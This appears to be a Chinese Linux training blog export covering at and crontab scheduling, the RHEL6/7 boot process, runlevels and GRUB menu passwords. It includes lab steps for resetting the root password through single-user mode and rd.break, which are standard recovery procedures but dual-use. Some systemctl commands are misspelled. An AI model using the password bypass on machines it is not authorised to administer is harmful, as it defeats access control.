<p>像上面这些例行性工作,通常你得要记录在日历上面才能避免忘记!不过, 由于我们常常在计算机前 面的缘故,如果计算机系统能够主动的通知我们的话,那么不就轻松多了!嘿嘿! 这个时候 Linux 的 计划任务就可以派上场了! 例如: 每一天早上 8:00 钟要服务器连接上音响,并自动播放音乐来唤你起床; 而中午 12:00 希望 Linux 可以发一封信到你的邮件信箱,提醒你可以去吃午餐了; 另外, 在每年的你爱人生 日的前一天,先发封信提醒你, 以免忘记这么重要的一天。</p>
<p>那么 Linux 的例行性工作是如何进行计划任务的呢? 咱 们的 Linux 是透过 crontab 和 at 这两个东西!这两个玩意儿有啥异同?就让我们来瞧瞧先!</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">一次性计划任务</th>
<th align="left">周期性计划任务</th>
</tr>
</thead>
<tbody><tr>
<td align="left">软件</td>
<td align="left">at-3.1.10-43.el6_2.1.x86_64</td>
<td align="left">cronie-1.4.4-12.el6.x86_64</td>
</tr>
<tr>
<td align="left">服务</td>
<td align="left">atd</td>
<td align="left">crond</td>
</tr>
<tr>
<td align="left">命令</td>
<td align="left">at</td>
<td align="left">crontab</td>
</tr>
<tr>
<td align="left">服务存放文件</td>
<td align="left">/etc/init.d/atd</td>
<td align="left">/etc/init.d/crond</td>
</tr>
<tr>
<td align="left">系统配置文件</td>
<td align="left">/etc/at.deny</td>
<td align="left">/etc/cron.deny /etc/cron.d/*</td>
</tr>
<tr>
<td align="left">程序缓存文件</td>
<td align="left">/var/spool/at</td>
<td align="left">/var/spool/cron/* /var/log/cron</td>
</tr>
</tbody></table>
<h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><p>当执行 at 程序并在终端输入命令后, 首先系统会到配置文件中寻找 at 相关的文档</p>
<ul>
<li>/etc/at.allow &lt;== 记录了允许使用 at 命令的用户名</li>
<li>/etc/at.deny &lt;== 记录了不允许使用 at 命令的用户名</li>
</ul>
<p>若以上两个文件都没有, 则系统默认只有 root 可以使用 at</p>
<p>输入的内容将被保存到以下目录中 /var/spool/at/*</p>
<h4 id="服务的启动命令"><a href="#服务的启动命令" class="headerlink" title="服务的启动命令"></a>服务的启动命令</h4><p>rhel6</p>
<p>service atd start 启动</p>
<p>service atd restart 重启</p>
<p>service atd status 查看</p>
<p>rhel7</p>
<p>systermctl start atd</p>
<p>systermctl restart atd</p>
<p>systermctl status atd</p>
<h4 id="at-命令的用法"><a href="#at-命令的用法" class="headerlink" title="at 命令的用法"></a>at 命令的用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">at [-mldv] TIME</span><br><span class="line"></span><br><span class="line">at -c 工作号码</span><br><span class="line"></span><br><span class="line">选项与参数 :</span><br><span class="line"></span><br><span class="line">-m 当 at 工作完成后 , 即使没有输出讯息 , 亦以 email 通知使用者该工作已完成。</span><br><span class="line">-l at -l =atq, 列出目前系统上面的所有该用户的 at 计划任务 ;</span><br><span class="line">-d at -d =atrm , 可以取消一个在 at 计划任务中的工作 ;</span><br><span class="line">-v 可以使用较明显的时间格式显出 at 计划任务中的任务列表 ;</span><br><span class="line">-c 可以列出后面接的该项工作的实际指令内容。</span><br></pre></td></tr></table></figure>

<h4 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h4><ol>
<li>再过五分钟后, 将 /root/.bashrc 寄给 root 自己</li>
<li>查看 at 计划任务中的工作</li>
<li>查看该计划任务的实际指令内容<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">60<span class="comment">#root@rhel6 ~]#at now + 5 minutes</span></span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> /bin/mail root -s <span class="string">"testing at job"</span> &lt; /root/.bashrc</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> &lt;EOT&gt;</span></span><br><span class="line">job 1 at 2016-06-30 00:40</span><br><span class="line"><span class="meta">[#</span><span class="bash">61<span class="comment">#root@rhel6 ~]#at -l</span></span></span><br><span class="line">1</span><br><span class="line">2016-06-30 00:40 a root</span><br><span class="line"><span class="meta">[#</span><span class="bash">62<span class="comment">#root@rhel6 ~]#date</span></span></span><br><span class="line">Thu Jun 30 00:37:21 CST 2016</span><br><span class="line"><span class="meta">[#</span><span class="bash">63<span class="comment">#root@rhel6 ~]#at -c 1</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> atrun uid=0 gid=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mail root 0</span></span><br><span class="line">umask 22</span><br><span class="line">.........</span><br><span class="line">此处省略</span><br><span class="line">OLDPWD=/var/log; export OLDPWD</span><br><span class="line">cd /root || &#123;</span><br><span class="line">echo 'Execution directory inaccessible' &gt;&amp;2</span><br><span class="line">exit 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;SHELL:-/bin/sh&#125; &lt;&lt; <span class="string">'marcinDELIMITER00a5c603'</span></span></span><br><span class="line">/bin/mail root -s "testing at job" &lt; /root/.bashrc</span><br><span class="line">marcinDELIMITER00a5c6034. 2016 年 10 月 20 日 12:00 广播一条信息 “ Happy birthday to me!”;取消该计划任务。</span><br><span class="line"><span class="meta">[#</span><span class="bash">68<span class="comment">#root@rhel6 ~]#at 12:00 2016-10-20</span></span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"Happy birthday to me!"</span>|wall</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> &lt;EOT&gt;</span></span><br><span class="line">job 2 at 2016-10-20 12:00</span><br><span class="line"><span class="meta">[#</span><span class="bash">69<span class="comment">#root@rhel6 ~]#atq</span></span></span><br><span class="line">2</span><br><span class="line">2016-10-20 12:00 a root</span><br><span class="line"><span class="meta">[#</span><span class="bash">70<span class="comment">#root@rhel6 ~]#at -l</span></span></span><br><span class="line">2</span><br><span class="line">2016-10-20 12:00 a root</span><br><span class="line"><span class="meta">[#</span><span class="bash">71<span class="comment">#root@rhel6 ~]#at -d 2</span></span></span><br><span class="line"><span class="meta">[#</span><span class="bash">72<span class="comment">#root@rhel6 ~]#atq</span></span></span><br></pre></td></tr></table></figure></li>
<li>由于机房预计划 2016/07/18 停电, 我想要在 2016/07/17 23:00 关机?<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">73<span class="comment">#root@rhel6 ~]#at 23:00 2016-07-17</span></span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> shutdown -h now</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> &lt;EOT&gt;</span></span><br><span class="line">job 3 at 2016-07-17 23:00</span><br><span class="line"><span class="meta">[#</span><span class="bash">74<span class="comment">#root@rhel6 ~]#atq</span></span></span><br><span class="line">3</span><br><span class="line">2016-07-17 23:00 a root</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><h4 id="crontab-服务的启动命令"><a href="#crontab-服务的启动命令" class="headerlink" title="crontab 服务的启动命令"></a>crontab 服务的启动命令</h4><p>rhel6</p>
<p>service crond start 启动</p>
<p>service crond restart 重启</p>
<p>service crond status 查看</p>
<p>rhel7</p>
<p>systermctl start crond</p>
<p>systermctl restart crond</p>
<p>systermctl status crond</p>
<h4 id="crontab-命令的用法"><a href="#crontab-命令的用法" class="headerlink" title="crontab 命令的用法"></a>crontab 命令的用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab [-u username] [-l|-e|-r]</span><br><span class="line"></span><br><span class="line">选项与参数 :</span><br><span class="line">-u 只有 root 使用 , 亦即帮其他使用者建立 / 移除 crontab 计划任务;</span><br><span class="line">-e 编辑 crontab 工作内容</span><br><span class="line">-l 查阅 crontab 工作内容</span><br><span class="line">-r 移除所有 crontab 的工作内容 , 若仅要移除一项 , 请用 -e 去编辑</span><br></pre></td></tr></table></figure>

<p>crontab -e 编辑的格式说明:</p>
<table>
<thead>
<tr>
<th align="left">代表意义</th>
<th align="left">分钟</th>
<th align="left">小时</th>
<th align="left">日期</th>
<th align="left">月份</th>
<th align="left">周</th>
</tr>
</thead>
<tbody><tr>
<td align="left">数字范围</td>
<td align="left">0-59</td>
<td align="left">0-23</td>
<td align="left">1-31</td>
<td align="left">1-12</td>
<td align="left">0-7</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">特殊字</th>
<th align="left">代表意义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*( 星号 )</td>
<td align="left">代表任何时刻</td>
</tr>
<tr>
<td align="left">,( 逗号 )</td>
<td align="left">代表分隔时段</td>
</tr>
<tr>
<td align="left">-( 减号 )</td>
<td align="left">代表一段时间范围</td>
</tr>
<tr>
<td align="left">/n( 斜线 )</td>
<td align="left">n 代表数字 , 『每隔 n 单位间隔』 , 例如每五分钟进行一次</td>
</tr>
</tbody></table>
<p><code>man 5 crontab</code> 查看具体用法帮助</p>
<h4 id="范例-1"><a href="#范例-1" class="headerlink" title="范例"></a>范例</h4><ol>
<li><p>student 每天 12 点发广播给自己提醒要吃饭拉!</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">vi 编辑画面 每项工作都是一行。</span><br><span class="line">0 12 * * * echo “Lunch time!!!!”|wall</span><br><span class="line">分 时 日 月 周 |&lt;======= 命令 ===========|</span><br></pre></td></tr></table></figure></li>
<li><p>每个月的第一天下午 2 点 15 分,将/etc 目录打包压缩成/tmp/etc.tar.bz2 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">15 14 1 * * tar -jcf /tmp/etc.tar.bz2 /etc</span><br></pre></td></tr></table></figure>
</li>
<li><p>周一到周五的晚上 10 点,将/var 目录打包压缩成/tmp/var.tar.bz2 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 22 * * 1-5 tar -jcf /tmp/var.tar.bz2 /var</span><br></pre></td></tr></table></figure></li>
<li><p>每天 0 点 23 分,2 点 23 分,4 点分…22 点 23 分,就输出 “ 休息一会 ” 到终端上。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">23 0-23/2 * * * echo "have a rest"</span><br></pre></td></tr></table></figure></li>
<li><p>每周日的 4 点 5 分提醒自己去跑步。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5 4 * * sun echo "run at 5 after 4 every sunday"</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="日志和计划任务课后作业"><a href="#日志和计划任务课后作业" class="headerlink" title="日志和计划任务课后作业"></a>日志和计划任务课后作业</h2><ol>
<li>记录所有日志类型的 info 级别以及大于 info 级别的信息,保存到/var/log/test,但是 mail 邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外</li>
<li>/var/log/test 日志轮询方式为:</li>
</ol>
<ul>
<li>每周轮询一次;</li>
<li>保留 6 个文件;</li>
<li>以时间命名;</li>
<li>创建与原日志同名的新文件。</li>
</ul>
<hr>
<ol start="3">
<li>再过 10 分钟后, 将 /root/.bashrc 寄给 root 自己</li>
<li>查看 at 计划任务中的工作</li>
<li>查看该计划任务的实际指令内容</li>
<li>由于机房预计划 2016/09/18 停电, 我想要在 2016/09/17 23:00 关 机?</li>
</ol>
<hr>
<ol>
<li>student 每天上午 11:50 发广播给自己提醒要吃饭拉!</li>
<li>每个月的第一天下午 5 点 30 分,将/etc 目录打包压缩成/tmp/etc.tar.bz2 文件。</li>
<li>周一到周六的晚上 9 点,将/var 目录打包压缩成/tmp/var.tar.bz2 文件。</li>
<li>每天 1 点 22 分,3 点 22 分,5 点 22 分…23 点 22 分,就输出 “ 休息一会 ” 到终端上。</li>
<li>每周六的 6 点 20 分提醒自己去跑步。</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 开机启动流程</title>
    <url>/2016/12/22/booboo_linux_base/10-Linux%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="启动流程概览"><a href="#启动流程概览" class="headerlink" title="启动流程概览"></a>启动流程概览</h2><ol>
<li>加载 BIOS 的硬件信息并自我测试 , 依据设定取得第一个可开机的装置 ;</li>
<li>读取并执行第一个开机装置内 MBR 的 boot Loader ( grub, spfdisk 等程序 );</li>
<li>依据 boot loader 的设定加载 Kernel</li>
<li>Kernel 会开始侦测硬件并加载驱动程序 ;</li>
<li>在硬件驱动成功后 ,Kernel 会主动呼叫 init 程序</li>
<li>init 会取得 run-level 信息 ;</li>
<li>init 执行 /etc/rc.d/rc.sysinit 档案来准备软件执行的作业环境 ( 如网络、时区等 );</li>
<li>init 执行 run-level 的各个服务的启动 (script 方式 );</li>
<li>init 执行 /etc/rc.d/rc.local 档案 ;</li>
<li>init 执行终端仿真程序 mingetty 来启动 login 程序 ,</li>
<li>最后等待用户登入</li>
</ol>
<h2 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h2><h3 id="开机软件-——-BIOS、Grub"><a href="#开机软件-——-BIOS、Grub" class="headerlink" title="开机软件 —— BIOS、Grub"></a>开机软件 —— BIOS、Grub</h3><p><img src="pic/33.png" alt="33"></p>
<h4 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h4><ol>
<li>BIOS 一个写入到主板上的一个软件程序,在开机的时候,计算机系统会主动执行第一个程序</li>
<li>HD 硬盘</li>
<li>MBR 主要启动记录区(Master Boot Record)该硬盘里的第一个扇区 512 bytes</li>
<li>boot loader 开机管理程序,可读取核心文件并执行 446 bytes</li>
<li>DPT 磁盘分割表(disk partition table)记录整颗硬盘分割状态 64 bytes</li>
<li>55AA 2 bytes</li>
</ol>
<h4 id="流程解释"><a href="#流程解释" class="headerlink" title="流程解释"></a>流程解释</h4><ul>
<li>通电后,服务器主版上的一个软件 BIOS 启动,他的任务就是找到带有开机程序的设备,此处以硬盘为例, BIOS 的任务结束;</li>
<li>该硬盘上的第一个扇区中有一个开机管理程序, rhel6 上为 grub1 , rhel7 上为 grub2 ,版本不同;</li>
<li>接下去就是 grub 在工作了。</li>
</ul>
<h4 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h4><p><em>开机时按下 pause break 暂停中断,可以看到 bios 的大概信息:</em></p>
<p><img src="pic/34.png" alt="34"></p>
<p>AMIBIOS(C)2006 American Megatrends, Inc.</p>
<p>基本输入输出系统的版本为 AMIBIOS ,为美国趋势科技</p>
<p>2006 年生产</p>
<p>HP System BIOS – 033 (09/01/2011)</p>
<p>惠普系统的基本输入输出系统,支持到 2011/01/09 的硬件</p>
<p>Processor 1 Initiallized at 2.26 GHz with 8 MB cache</p>
<p>处理器 cpu 一个,频率为 2.26GHz , 8M 缓冲</p>
<p>16384MB Total Memory Detected</p>
<p>16G 内存</p>
<p>Asset Tag : 0111049</p>
<p>资产编号为 0111049</p>
<p>BMC Firmware Version 04.04(Jul/01/2009)</p>
<p>BMC SDR Version : 2.18.1.17</p>
<p>basebiard management controller 底板管理控制器的缩写,时一个在 IPMI 结构下提供智能管理的控制器</p>
<p>IPMI 时智能平台管理界面,即与 intel 结构的企业系统中所使用外围设备采用的一种工业标准。</p>
<p>USB Device(s) : 1 Keyboard , 1 Mouse</p>
<p>usb 设备有一个鼠标一个键盘,此处可以查看是否有人恶意用 usb 设备要攻击服务器</p>
<p>Auto-Detecting AHCI PORT 1 .. IDE Hard Disk 自动检测</p>
<p><em>开机按下 F10 ,进入 BIOS 管理界面</em></p>
<p><img src="pic/35.png" alt="35"></p>
<p><img src="pic/36.png" alt="36"></p>
<p><em>IPMI</em></p>
<p>HP 服务器远程管理平台</p>
<p><img src="pic/37.png" alt="37"></p>
<p><img src="pic/38.png" alt="38"></p>
<h3 id="开机文档-——-menu-lst、grub-conf"><a href="#开机文档-——-menu-lst、grub-conf" class="headerlink" title="开机文档 —— menu.lst、grub.conf"></a>开机文档 —— menu.lst、grub.conf</h3><h4 id="Grub-配置文档"><a href="#Grub-配置文档" class="headerlink" title="Grub 配置文档"></a>Grub 配置文档</h4><ul>
<li>menu.lst</li>
<li>grub.conf</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 grub]# ll /boot/grub/</span><br><span class="line">total 274</span><br><span class="line">-rw-r--r--. 1 root root 63 Jul 2 2015 device.map</span><br><span class="line">-rw-r--r--. 1 root root 13380 Jul 2 2015 e2fs_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 12620 Jul 2 2015 fat_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 11748 Jul 2 2015 ffs_stage1_5</span><br><span class="line">-rw-------. 1 root root 796 Jul 2 2015 grub.conf</span><br><span class="line">-rw-r--r--. 1 root root 11756 Jul 2 2015 iso9660_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 13268 Jul 2 2015 jfs_stage1_5</span><br><span class="line">lrwxrwxrwx. 1 root root 11 Jul 2 2015 menu.lst -&gt; ./grub.conf</span><br><span class="line">-rw-r--r--. 1 root root 11956 Jul 2 2015 minix_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 14412 Jul 2 2015 reiserfs_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 1341 May 7 2010 splash.xpm.gz</span><br><span class="line">-rw-r--r--. 1 root root 512 Jul 2 2015 stage1</span><br><span class="line">-rw-r--r--. 1 root root 126100 Jul 2 2015 stage2</span><br><span class="line">-rw-r--r--. 1 root root 12024 Jul 2 2015 ufs2_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 11364 Jul 2 2015 vstafs_stage1_5</span><br><span class="line">-rw-r--r--. 1 root root 13964 Jul 2 2015 xfs_stage1_5</span><br><span class="line">[root@rhel6 grub]# vim grub.conf</span><br><span class="line">default=0		===&gt;默认菜单</span><br><span class="line">timeout=5		===&gt;启动菜单超时5秒进入默认启动内核</span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz	===&gt;菜单的背景图片位置</span><br><span class="line">hiddenmenu		===&gt;默认不看启动菜单</span><br><span class="line">title Red Hat Enterprise Linux (2.6.32-431.el6.x86_64)</span><br><span class="line">开机启动的系统名称(可以更改对其他没有影响),指定启动硬盘位置在第一个硬盘的第一个分区</span><br><span class="line">root (hd0,0)</span><br><span class="line">指定核心文件的名称及位置 /boot/ ,指定语言等等</span><br><span class="line">kernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/vg_rhel6-LogVol01 rd_NO_LUKS</span><br><span class="line">LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 KEYBOARDTYPE=pc</span><br><span class="line">KEYTABLE=us rd_LVM_LV=vg_rhel6/LogVol01 rd_NO_DM rhgb quiet</span><br><span class="line">指定核心加载的模块文件 /boot/</span><br><span class="line">initrd /initramfs-2.6.32-431.el6.x86_64.img</span><br></pre></td></tr></table></figure>

<h4 id="流程解释-1"><a href="#流程解释-1" class="headerlink" title="流程解释"></a>流程解释</h4><ul>
<li>grub 软件的任务就是找到核心文件,并加载该文件</li>
<li>内核的第一任务就是驱动硬件</li>
<li>内核第二任务就是呼叫 init 程序,接下来就交给 init 了</li>
</ul>
<h3 id="init-程序"><a href="#init-程序" class="headerlink" title="init 程序"></a>init 程序</h3><h4 id="流程解释-2"><a href="#流程解释-2" class="headerlink" title="流程解释"></a>流程解释</h4><ul>
<li>init 程序挂接 /etc 和 /lib 所在的目录分区</li>
<li>执行 /etc/inittab 文件,取得 run-level 信息,判断是否开启终端、网络等</li>
<li>执行 /etc/rc.d/rc.sysinit 初始化环境 ( 如网络、时区等 )</li>
<li>执行 run-level 的各个服务的启动 (script 方式 );</li>
<li>执行 /etc/rc.d/rc.local 档案</li>
<li>执行终端仿真程序 mingetty 来启动 login 程序,最后等待用户登入</li>
</ul>
<h4 id="init-执行的相关文件"><a href="#init-执行的相关文件" class="headerlink" title="init 执行的相关文件"></a>init 执行的相关文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# cat /etc/inittab</span><br><span class="line"><span class="meta">#</span><span class="bash"> Default runlevel. The runlevels used are:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 0 - halt (Do NOT <span class="built_in">set</span> initdefault to this)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1 - Single user mode</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2 - Multiuser, without NFS (The same as 3, <span class="keyword">if</span> you <span class="keyword">do</span> not have networking)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3 - Full multiuser mode</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4 - unused</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5 - X11</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6 - reboot (Do NOT <span class="built_in">set</span> initdefault to this)</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">id:5:initdefault:		===&gt;默认启动等级(run-level)为5(中间的数字为启动等级)</span><br><span class="line">[root@rhel6 etc]# ll /etc/rc.d	===&gt;根据默认启动等级，来读取相应的rc0-6.d目录中的文件</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 init.d</span><br><span class="line">-rwxr-xr-x. 1 root root 2617 Oct 10 2013 rc</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc0.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc1.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc2.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc3.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc4.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc5.d</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 2 2015 rc6.d</span><br><span class="line">-rwxr-xr-x. 1 root root 220 Oct 10 2013 rc.local</span><br><span class="line">-rwxr-xr-x. 1 root root 19432 Oct 10 2013 rc.sysinit</span><br></pre></td></tr></table></figure>

<p>文件夹里都是软连接，软链接链接到/etc/rc.d/init.d目录下的文件，目录下都是服务的启动脚本，目录和etc/init.d下的内容一样，因为有个软连接在etc下面rcX.d下的文件K开头表示服务要关闭的，S开头的表示系统启动时要开启的，（例如rc0.d下，几乎都是K打头的），在5里后面的数字标示优先级，数字小优先级高，在6里这些数字无用，因为是并行的，没有依赖关系。</p>
<p>无论是3还是5的runlevel，最后都会读到S99local文件，链接到/etc/rc.d/rc.local文件</p>
<p>文件说明：这个脚本在所有脚本执行完之后执行，开机过程汇总最后读到的一个文件，这个文件是开机自定义启动脚本，把自己想要执行的命令写进来。系统启动命令也会完成。</p>
<p>备注:以上分析均为 rhel6 操作系统, rhel7 启动改为 systemd 模式,相关文件在 <code>/usr/lib/systemd/system/*</code></p>
<h3 id="run-level-启动等级"><a href="#run-level-启动等级" class="headerlink" title="run-level(启动等级)"></a>run-level(启动等级)</h3><p>Runlevel 0 是让init关闭所有进程并终止系统。</p>
<p>Runlevel 1 是用来将系统转到单用户模式，单用户模式只能有系统管理员进入，在该模式下处理那些在有登录用户的情况下不能进行更改的文件。</p>
<p>Runlevel 2 是允许系统进入多用户的模式，但并不支持文件共享，这种模式很少应用。</p>
<p>Runlevel 3 是最常用的运行模式，主要用来提供真正的多用户模式，也是多数服务器的缺省模式。</p>
<p>Runlevel 4 一般不被系统使用，用户可以设计自己的系统状态并将其应用到runlevel 4阶段，尽管很少使用，但使用该系统可以实现一些特定的登录请求。</p>
<p>Runlevel 5 是将系统初始化为专用的X Window终端。对功能强大的Linux系统来说，这并不是好的选择，但用户如果需要这样，也可以通过在runlevel启动来实现该方案。</p>
<p>Runlevel 6 是关闭所有运行的进程并重新启动系统。</p>
<h2 id="相关的命令"><a href="#相关的命令" class="headerlink" title="相关的命令"></a>相关的命令</h2><p>rhel6</p>
<p>chkconfig –list    ===&gt;查看不同等级中各项服务的启动情况(开机启动项)</p>
<p>chkconfig 服务名 on    ===&gt;开启某个服务开机自启动，off代表关闭</p>
<p>chkconfig –level 35 服务名 off    ===&gt;在启动等级为3和5的时候该服务不开机启动</p>
<p>rhel7</p>
<p>开机自启的服务通过systemctl enable命令来实现</p>
<p>Systemctl enable httpd    ===&gt;自启动httpd服务，关闭使用disable。</p>
<p>systemctl get-default        ===&gt;查看当前默认启动级别(启动级别的说明查看/etc/inittab)</p>
<p>systemctl set-default multi-user.target    ===&gt;设置默认启动级别为3(7的的启动级别名称有所变化)</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="rhel6-单用户模式修改密码"><a href="#rhel6-单用户模式修改密码" class="headerlink" title="rhel6 单用户模式修改密码"></a>rhel6 单用户模式修改密码</h3><ul>
<li>1&gt; 进入到数及时界面时,按上下键进入以下界面,选择 kernel 一行,按下 e 进行编辑</li>
<li>2&gt; 在最后追加 “空格”和1 或者 “空格” single 后,按下 esc</li>
<li>3&gt; 再按下 b ,启动后,进入单人模式后,输入 passwd 进行密码修改,修改完成后, reboot 即可。</li>
</ul>
<p><img src="pic/39.png" alt="39"></p>
<p><img src="pic/40.png" alt="40"></p>
<p><img src="pic/41.png" alt="41"></p>
<h3 id="rhel7-单用户模式修改密码"><a href="#rhel7-单用户模式修改密码" class="headerlink" title="rhel7 单用户模式修改密码"></a>rhel7 单用户模式修改密码</h3><ul>
<li>1&gt; 进入如下界面后按 e 进入编辑模式</li>
<li>2&gt; 找到 linux16 开始的那一行,删除没用的,在最后追加 rd.break ,然后按 Ctrl+x 重启即可进入单人模式</li>
<li>3&gt; 进入单用户模式后,用 mount 命令查看一下,会发现根目录时只读模式,因此需要重新挂载为读写模式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw /sysroot</span><br><span class="line">chroot /sysroot		===&gt;提高权限</span><br><span class="line">passwd				===&gt;修改密码的命令</span><br><span class="line">touch /.autorelabel ===&gt;autorelabel 自动重新标记, selinux</span><br><span class="line">exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p><img src="pic/42.png" alt="42"></p>
<p><img src="pic/43.png" alt="43"></p>
<p>###rhel6 GRUB菜单加密</p>
<p>grub-md5-crypt</p>
<p>输入密码，生成一串MD5值，这个就是grub密码，复制好这段内容，粘贴到配置文件中</p>
<p>vim /boot/grub/grub.conf   </p>
<p>title那一行的上面加上“password redhat”这样做是明文密码，不安全，所以也可写为“password –-md5 xxxxxxxxx”</p>
<p>这一行要放在title的上面</p>
<p>放在title的下面是系统启动需要密码才可以启动</p>
<h3 id="rhel7-GRUB2菜单加密"><a href="#rhel7-GRUB2菜单加密" class="headerlink" title="rhel7 GRUB2菜单加密"></a>rhel7 GRUB2菜单加密</h3><p>vim /etc/grub.d/40_custom</p>
<p>set superusers=”root”        ===&gt;设置超级用户的名称，注意：名称任意可以不用是系统中存在的用户</p>
<p>password root redhat            ===&gt;设置用户名和密码，注意：该密码为明文，如果需要密文需要生成密文密码</p>
<p>保存退出</p>
<p>grub2-mkconfig -o /boot/grub2/grub.cfg        ===&gt;使用该命令来重新生成grub.cfg文件来使配置生效</p>
<p>grub2-mkpasswd-pbkdf2    ===&gt;该命令为生成加密密码</p>
<p>password_pbkdf2         ===&gt;如果使用加密的密文需要定义密码的加密方式，后面同上跟上用户名和加密后的密码</p>
<h2 id="Linux-开机启动流程课后作业"><a href="#Linux-开机启动流程课后作业" class="headerlink" title="Linux 开机启动流程课后作业"></a>Linux 开机启动流程课后作业</h2><ol>
<li>名词解释</li>
</ol>
<p>BIOS</p>
<p>MBR</p>
<p>boot loader</p>
<p>grub</p>
<p>DPT</p>
<p>55AA</p>
<ol start="2">
<li>请自己描述 linux 开机启动的流程,并画出流程图。</li>
<li>linux 破解 root 密码</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 文件系统和磁盘管理</title>
    <url>/2016/12/22/booboo_linux_base/09-Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="资源虚拟化"><a href="#资源虚拟化" class="headerlink" title="资源虚拟化"></a>资源虚拟化</h3><p><img src="pic/20.png" alt="20"></p>
<p>Linux操作系统内核由6个部分组成：</p>
<ul>
<li>进程调度与管理</li>
<li>主存管理和虚存管理</li>
<li>VFS和文件管理</li>
<li>设备管理</li>
<li>网络接口和通信</li>
<li>用来实现资源抽象</li>
<li>资源分配和资源共享等功能。</li>
</ul>
<h3 id="文件系统的概念"><a href="#文件系统的概念" class="headerlink" title="文件系统的概念"></a>文件系统的概念</h3><p>操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。</p>
<p>从系统角度来看，文件系统是对文件存储设备的空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统。</p>
<p>具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。</p>
<h3 id="文件系统的类型"><a href="#文件系统的类型" class="headerlink" title="文件系统的类型"></a>文件系统的类型</h3><p>查看系统支持的文件系统<br><code>ls /lib/modules/$(uname -r)/kernel/fs</code></p>
